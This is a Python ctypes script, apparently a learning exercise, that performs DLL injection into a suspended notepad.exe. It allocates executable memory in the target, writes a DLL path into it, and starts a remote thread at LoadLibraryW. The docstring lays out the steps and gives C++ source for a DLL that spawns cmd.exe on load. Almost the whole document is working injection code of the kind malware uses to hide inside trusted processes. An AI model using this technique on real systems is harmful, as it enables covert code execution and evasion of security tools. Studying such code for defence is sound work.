"""
(barebones) DLL injection into notepad.exe, via CreateRemoteThread()
- LoadLibraryW() used to load .dll, which is passed as an argument into CreateRemoteThread()


Note:
-----
[+] CreateRemoteThread()
lpStartAddress (3rd arg) == LoadLibraryW address
- here you tell notepad.exe "Start a new thread at the address of LoadLibraryW"
- (in shellcode injection, this is == lpBaseAddress)

lpParameter (4th arg) == lpBaseAddress from VirtualAllocEx()
- tells thread "for first argument, look at lpBaseAddress, where path-string to dummy.dll was written
- notepad.exe then runs LoadLibraryW("c:\path_to\dummy.dll")
- (in shellcode injection, this is == None)


Steps:
------
1: Create SUSPENDED process                          			-> CreateProcessW()
2: Allocate memory for .dll                          			-> VirtualAllocEx()
3: Write payload (DLL path, as string) into allocated memory    -> WriteProcessMemory()
4: Locate Virtual Address for LoadLibraryW() within kernel32.dll
5: Create remote thread, pointing to LoadLibrary() as loader    -> CreateRemoteThread()
6: Execute, Resume Thread										-> ResumeThread()


dummy.dll to spawn cmd.exe (cpp file to be compiled)
----------------------------------------------------
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
		WinExec("C:\\Windows\\System32\\cmd.exe", SW_SHOW);
    }
    return TRUE;
}

"""


import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)



# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]



# to handle ctypes truncation
kernel32.VirtualAllocEx.restype = ctypes.c_void_p


# ----------------------------------
# Function Definitions
# ----------------------------------

def create_process():    
    lpApplicationName = r"c:\windows\system32\notepad.exe"

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    if not kernel32.CreateProcessW(lpApplicationName, None, None, None, False, 0x04, None, None, ctypes.byref(lpStartupInfo), ctypes.byref(lpProcessInformation)):
        raise ctypes.WinError(ctypes.get_last_error())

    hThread = wintypes.HANDLE(lpProcessInformation.hThread)
    hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  

    return hThread, hProcess


def virtual_alloc_ex(hProcess, size):
    lpAddress = ctypes.c_void_p(0)
    dwSize = ctypes.c_size_t(size)

    lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, 0x1000 | 0x2000, 0x40)
    if not lpBaseAddress:
        raise ctypes.WinError(ctypes.get_last_error())

    return ctypes.c_void_p(lpBaseAddress)


def write_payload(hProcess, lpBaseAddress, lpBuffer):
    bytes_written = ctypes.c_size_t()
    nSize = len(lpBuffer)

    if not kernel32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, ctypes.byref(bytes_written)):
        raise ctypes.WinError(ctypes.get_last_error())


def create_remote_thread(hProcess, lpStartAddress, lpParameter):
    lpThreadId = wintypes.DWORD()
    if not kernel32.CreateRemoteThread(
        hProcess, 
        None, 
        0, 
        ctypes.c_void_p(lpStartAddress),   # to handle ctypes truncation
        lpParameter,
        0,
        ctypes.byref(lpThreadId)):
        raise ctypes.WinError(ctypes.get_last_error())


# -------------------------------
# Main functionality starts here
# -------------------------------

# Step 1: create SUSPENDED process
hThread, hProcess = create_process()



# DLL prep
dll_path = r"c:\path_to_compiled\dummy.dll"
dll_bytes = dll_path.encode("utf-16le") + b"\x00\x00"

# Step 2: allocate memory
lpBaseAddress = virtual_alloc_ex(hProcess, len(dll_bytes))

# Step 3: write payload into allocated memory
write_payload(hProcess, lpBaseAddress, dll_bytes)



# Get address of LoadLibraryW
loadlibrary_address = ctypes.cast(kernel32.LoadLibraryW, ctypes.c_void_p).value

'''
# Alternative to get address of LoadLibraryW 
# - requires function prototypes to work effectively

h_getmodule = kernel32.GetModuleHandleW('kernel32.dll')
loadlibrary_address = kernel32.GetProcAddress(h_getmodule, b"LoadLibraryW")
'''

# Step 4: create/execute new thread
create_remote_thread(
    hProcess, 
    lpStartAddress=loadlibrary_address, 
    lpParameter=lpBaseAddress
)

# Step 5: resume original thread/process execution
kernel32.ResumeThread(hThread)
